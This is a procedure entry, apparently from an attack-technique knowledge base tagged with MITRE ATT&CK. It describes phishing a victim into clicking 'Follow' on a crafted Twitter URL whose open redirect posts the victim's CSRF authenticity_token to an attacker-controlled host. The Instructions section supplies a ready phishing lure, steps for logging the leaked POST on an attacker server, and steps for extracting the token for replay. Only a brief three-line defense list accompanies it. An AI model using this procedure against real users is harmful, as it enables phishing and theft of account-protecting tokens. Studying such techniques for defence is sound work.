---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - phishing
  - token-leak
  - social-engineering
  - twitter
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:24:26.555Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Trick-Victim-to-Leak-Authenticity-Token-via-Follow-Click

## Summary

This procedure uses social engineering to lure a victim into clicking the 'Follow' button on a malicious Twitter follow URL, resulting in a POST request that leaks the CSRF authenticity_token to an attacker-controlled server.

## Description

Once the victim visits the crafted URL (e.g., https://mobile.twitter.com/messages/follow?recipient=/example.com), the app renders a follow prompt. Clicking 'Follow' submits a POST to the external domain with the token in the body, bypassing CSRF protections due to the open redirect. This enables token theft for further exploitation.

## Requirements

1. Malicious URL from previous procedure
2. Attacker server configured to log POST requests
3. Phishing delivery method (e.g., email with enticing pretext like "Follow for updates")

## Defense

Defensive measures and detection strategies:

- Educate users on suspicious links and follow requests
- Implement referrer checks on POST endpoints
- Log and alert on cross-origin POSTs from app features

## Objectives

1. Deliver the malicious URL to the victim
2. Capture the authenticity_token from the incoming POST
3. Validate token usability for next steps

## Instructions

### Step 1: Prepare Phishing Delivery

**Context**: Create a pretext to get the victim to click the URL and follow.

Draft an email or message: "Hey, follow this Twitter user for cool tips: [malicious URL]"

> Expected: Victim receives and interacts with the link.

### Step 2: Monitor for Interaction

**Context**: Watch the attacker server for the POST request triggered by the follow click.

Ensure server logs include request body (e.g., using tools like ngrok for tunneling if needed).

> Expected: POST to https://example.com/ with body containing authenticity_token=TOKEN_VALUE&other_params.

### Step 3: Extract the Token

**Context**: Parse the logged request to obtain the token.

From server logs, copy the authenticity_token value.

> Expected: Valid token string extracted, ready for replay.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- phishing
- token-leak
